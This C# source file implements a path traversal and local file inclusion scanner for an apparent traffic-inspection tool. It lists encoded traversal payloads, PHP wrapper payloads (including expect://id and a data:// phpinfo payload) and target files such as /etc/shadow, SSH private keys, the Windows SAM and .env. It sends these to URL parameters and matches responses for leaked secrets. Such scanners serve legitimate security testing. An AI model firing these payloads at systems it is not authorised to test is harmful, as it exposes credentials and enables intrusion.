using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Advanced Path Traversal and File Inclusion vulnerability scanner
    /// </summary>
    public class PathTraversalScannerService
    {
        private HttpClient _httpClient;
        private List<string> _pathTraversalPayloads;
        private List<string> _fileInclusionPayloads;
        private List<string> _sensitiveFiles;

        public PathTraversalScannerService()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(30);
            InitializePayloads();
        }

        private void InitializePayloads()
        {
            _pathTraversalPayloads = new List<string>
            {
                // Basic traversal
                "../", "..\\", ".../", "...\\",

                // URL encoded
                "%2e%2e/", "%2e%2e\\", "%2e%2e%2f", "%2e%2e%5c",

                // Double URL encoded
                "%252e%252e/", "%252e%252e\\", "%252e%252e%252f", "%252e%252e%255c",

                // UTF-8 encoded
                "..%c0%af", "..%c1%9c",

                // Extended traversal
                "....//", "....\\\\", ".....///", ".....\\\\\\",

                // Null byte bypass (legacy)
                "../%00", "..\\%00", "../%00.jpg", "..\\%00.png",

                // Absolute paths
                "/etc/passwd", "C:\\windows\\win.ini", "/proc/self/environ",
                "C:\\boot.ini", "/etc/shadow", "C:\\windows\\system32\\config\\sam",

                // Relative with absolute
                "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                "../../../../../../../../etc/passwd",
                "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",

                // Bypass filters
                "..;/", "..;//", "..;/;/", "..//", "..\\\\",
                ".../.../.../.../etc/passwd", "...\\..\\..\\.../windows/win.ini"
            };

            _fileInclusionPayloads = new List<string>
            {
                // LFI basic
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",

                // PHP wrappers
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input", "php://filter/read=string.rot13/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "expect://id", "file:///etc/passwd",

                // Log poisoning
                "/var/log/apache2/access.log", "/var/log/apache/access.log",
                "/var/log/httpd/access_log", "C:\\xampp\\apache\\logs\\access.log",
                "/proc/self/environ", "/proc/self/fd/0",

                // Common files
                "../wp-config.php", "../config.php", "../database.php",
                "../../application/config/database.php", "../.env",
                "web.config", "WEB-INF/web.xml"
            };

            _sensitiveFiles = new List<string>
            {
                // Linux/Unix
                "etc/passwd", "etc/shadow", "etc/group", "etc/hosts",
                "etc/apache2/apache2.conf", "etc/ssh/sshd_config",
                "var/www/html/.htaccess", "root/.bash_history",
                "root/.ssh/id_rsa", "home/.ssh/id_rsa",

                // Windows
                "windows/win.ini", "boot.ini", "windows/system.ini",
                "windows/system32/config/sam", "windows/repair/sam",
                "windows/system32/drivers/etc/hosts",

                // Application files
                "wp-config.php", ".env", "config.php", "database.yml",
                "web.config", "app/config/parameters.yml",
                "WEB-INF/web.xml", "application.properties"
            };
        }

        public async Task<PathTraversalScanReport> ScanUrl(string url, PathTraversalOptions options = null)
        {
            options ??= new PathTraversalOptions();

            var report = new PathTraversalScanReport
            {
                Url = url,
                StartTime = DateTime.Now,
                Vulnerabilities = new List<PathTraversalVulnerability>()
            };

            try
            {
                // Extract file parameters from URL
                var fileParams = ExtractFileParameters(url);

                foreach (var param in fileParams)
                {
                    var vulns = await TestParameter(url, param, options);
                    report.Vulnerabilities.AddRange(vulns);

                    if (options.StopOnFirstVulnerability && vulns.Any())
                        break;
                }

                report.EndTime = DateTime.Now;
                report.Duration = (report.EndTime - report.StartTime).TotalSeconds;
                report.VulnerabilitiesFound = report.Vulnerabilities.Count;
                report.TotalTests = report.TestsPerformed;
                report.Status = report.VulnerabilitiesFound > 0 ? "Vulnerable" : "Not Vulnerable";
            }
            catch (Exception ex)
            {
                report.Error = ex.Message;
                report.Status = "Error";
            }

            return report;
        }

        public async Task<PathTraversalScanReport> ScanTrafficEntry(TrafficEntry entry, PathTraversalOptions options = null)
        {
            return await ScanUrl(entry.Url, options);
        }

        private List<string> ExtractFileParameters(string url)
        {
            var parameters = new List<string>();

            try
            {
                var uri = new Uri(url);
                var query = uri.Query.TrimStart('?');

                if (string.IsNullOrEmpty(query))
                    return parameters;

                var pairs = query.Split('&');
                foreach (var pair in pairs)
                {
                    var parts = pair.Split('=');
                    if (parts.Length == 2)
                    {
                        var name = parts[0];
                        var value = parts[1];

                        // Check if parameter likely refers to a file
                        if (IsFileParameter(name, value))
                        {
                            parameters.Add(name);
                        }
                    }
                }
            }
            catch { }

            return parameters;
        }

        private bool IsFileParameter(string name, string value)
        {
            var fileIndicators = new[]
            {
                "file", "path", "page", "include", "dir", "document", "folder",
                "pg", "style", "pdf", "template", "php", "cat", "action", "board",
                "date", "detail", "download", "prefix", "include", "inc", "locate",
                "show", "site", "type", "view", "content", "layout", "mod", "conf"
            };

            var nameLower = name.ToLower();
            var valueLower = value.ToLower();

            // Check if parameter name contains file indicators
            if (fileIndicators.Any(indicator => nameLower.Contains(indicator)))
                return true;

            // Check if value looks like a file path
            if (valueLower.Contains("/") || valueLower.Contains("\\") ||
                valueLower.Contains(".php") || valueLower.Contains(".html") ||
                valueLower.Contains(".txt") || valueLower.Contains(".xml"))
                return true;

            return false;
        }

        private async Task<List<PathTraversalVulnerability>> TestParameter(string url, string parameter, PathTraversalOptions options)
        {
            var vulnerabilities = new List<PathTraversalVulnerability>();

            // Test path traversal payloads
            foreach (var payload in _pathTraversalPayloads)
            {
                foreach (var sensitiveFile in _sensitiveFiles.Take(options.MaxFilesToTest))
                {
                    var fullPayload = payload + sensitiveFile;
                    var testUrl = ReplaceParameterValue(url, parameter, fullPayload);

                    var vuln = await TestSinglePayload(testUrl, parameter, fullPayload, "Path Traversal");
                    if (vuln != null)
                    {
                        vulnerabilities.Add(vuln);
                        if (options.StopOnFirstVulnerability)
                            return vulnerabilities;
                    }

                    if (options.DelayBetweenRequests > 0)
                        await Task.Delay(options.DelayBetweenRequests);
                }
            }

            // Test file inclusion payloads
            foreach (var payload in _fileInclusionPayloads)
            {
                var testUrl = ReplaceParameterValue(url, parameter, payload);

                var vuln = await TestSinglePayload(testUrl, parameter, payload, "File Inclusion");
                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    if (options.StopOnFirstVulnerability)
                        return vulnerabilities;
                }

                if (options.DelayBetweenRequests > 0)
                    await Task.Delay(options.DelayBetweenRequests);
            }

            return vulnerabilities;
        }

        private async Task<PathTraversalVulnerability> TestSinglePayload(string url, string parameter, string payload, string type)
        {
            try
            {
                var response = await _httpClient.GetAsync(url);
                var body = await response.Content.ReadAsStringAsync();

                if (IsVulnerable(body, payload, type))
                {
                    return new PathTraversalVulnerability
                    {
                        Parameter = parameter,
                        Payload = payload,
                        Type = type,
                        Url = url,
                        Evidence = ExtractEvidence(body, type),
                        Severity = DetermineSeverity(type, body),
                        StatusCode = (int)response.StatusCode,
                        ResponseLength = body.Length
                    };
                }
            }
            catch { }

            return null;
        }

        private bool IsVulnerable(string response, string payload, string type)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            // Patterns indicating successful path traversal
            var vulnerabilityPatterns = new Dictionary<string, string[]>
            {
                {
                    "Linux", new[]
                    {
                        "root:x:", "daemon:", "bin:", "sys:", "nobody:",  // /etc/passwd
                        "root:!:", "daemon:!:",  // /etc/shadow
                        "127.0.0.1", "localhost",  // /etc/hosts
                        "PRIVATE KEY", "BEGIN RSA PRIVATE KEY"  // SSH keys
                    }
                },
                {
                    "Windows", new[]
                    {
                        "[extensions]", "[files]", "[Mail]",  // win.ini
                        "[boot loader]", "[operating systems]",  // boot.ini
                        "DRIVER.SYS", "[drivers]",  // system.ini
                        "Security Account Manager"  // SAM
                    }
                },
                {
                    "Application", new[]
                    {
                        "DB_PASSWORD", "DB_HOST", "DB_NAME",  // config files
                        "<?php", "<?=",  // PHP code
                        "APP_KEY", "APP_SECRET",  // .env
                        "connectionString", "<configuration>"  // web.config
                    }
                }
            };

            foreach (var category in vulnerabilityPatterns)
            {
                foreach (var pattern in category.Value)
                {
                    if (response.Contains(pattern))
                        return true;
                }
            }

            // Check for PHP wrapper success indicators
            if (type == "File Inclusion")
            {
                if (payload.Contains("php://filter") && IsBase64(response.Trim()))
                    return true;

                if (payload.Contains("data://") && response.Contains("phpinfo"))
                    return true;
            }

            return false;
        }

        private bool IsBase64(string str)
        {
            if (string.IsNullOrEmpty(str) || str.Length % 4 != 0)
                return false;

            return Regex.IsMatch(str, @"^[a-zA-Z0-9+/]*={0,2}$");
        }

        private string ExtractEvidence(string response, string type)
        {
            // Extract first 200 characters as evidence
            var maxLength = Math.Min(200, response.Length);
            var evidence = response.Substring(0, maxLength);

            // Clean up for readability
            evidence = evidence.Replace("\r\n", " ").Replace("\n", " ");
            evidence = Regex.Replace(evidence, @"\s+", " ");

            return evidence;
        }

        private string DetermineSeverity(string type, string response)
        {
            if (response.Contains("root:") || response.Contains("PRIVATE KEY") ||
                response.Contains("DB_PASSWORD") || response.Contains("APP_KEY"))
            {
                return "Critical";
            }

            if (type == "File Inclusion" || response.Contains("<?php"))
            {
                return "High";
            }

            return "Medium";
        }

        private string ReplaceParameterValue(string url, string parameter, string newValue)
        {
            try
            {
                var uri = new Uri(url);
                var query = uri.Query.TrimStart('?');
                var pairs = query.Split('&');
                var newPairs = new List<string>();

                foreach (var pair in pairs)
                {
                    var parts = pair.Split('=');
                    if (parts.Length == 2 && parts[0] == parameter)
                    {
                        newPairs.Add($"{parts[0]}={Uri.EscapeDataString(newValue)}");
                    }
                    else
                    {
                        newPairs.Add(pair);
                    }
                }

                var newQuery = string.Join("&", newPairs);
                return $"{uri.Scheme}://{uri.Host}{uri.AbsolutePath}?{newQuery}";
            }
            catch
            {
                return url;
            }
        }

        public string GenerateReport(PathTraversalScanReport report)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine("      Path Traversal Vulnerability Scan Report");
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine($"URL: {report.Url}");
            sb.AppendLine($"Status: {report.Status}");
            sb.AppendLine($"Duration: {report.Duration:F2}s");
            sb.AppendLine($"Tests Performed: {report.TotalTests}");
            sb.AppendLine($"Vulnerabilities Found: {report.VulnerabilitiesFound}");
            sb.AppendLine();

            if (report.Vulnerabilities.Any())
            {
                var grouped = report.Vulnerabilities.GroupBy(v => v.Type);

                foreach (var group in grouped)
                {
                    sb.AppendLine($"[{group.Key}] - {group.Count()} vulnerability(ies)");
                    sb.AppendLine(new string('-', 60));

                    foreach (var vuln in group)
                    {
                        sb.AppendLine($"  Parameter: {vuln.Parameter}");
                        sb.AppendLine($"  Payload: {vuln.Payload}");
                        sb.AppendLine($"  Severity: {vuln.Severity}");
                        sb.AppendLine($"  Status Code: {vuln.StatusCode}");
                        sb.AppendLine($"  Evidence: {vuln.Evidence}");
                        sb.AppendLine();
                    }
                }
            }
            else
            {
                sb.AppendLine("No path traversal vulnerabilities detected.");
            }

            if (!string.IsNullOrEmpty(report.Error))
            {
                sb.AppendLine($"Error: {report.Error}");
            }

            sb.AppendLine("═══════════════════════════════════════════════════════════");

            return sb.ToString();
        }
    }

    #region Models

    public class PathTraversalOptions
    {
        public int DelayBetweenRequests { get; set; } = 100;
        public bool StopOnFirstVulnerability { get; set; } = false;
        public int MaxFilesToTest { get; set; } = 10;
    }

    public class PathTraversalScanReport
    {
        public string Url { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public int TotalTests { get; set; }
        public int TestsPerformed { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public string Status { get; set; }
        public List<PathTraversalVulnerability> Vulnerabilities { get; set; }
        public string Error { get; set; }
    }

    public class PathTraversalVulnerability
    {
        public string Parameter { get; set; }
        public string Payload { get; set; }
        public string Type { get; set; }
        public string Url { get; set; }
        public string Evidence { get; set; }
        public string Severity { get; set; }
        public int StatusCode { get; set; }
        public int ResponseLength { get; set; }
    }

    #endregion
}
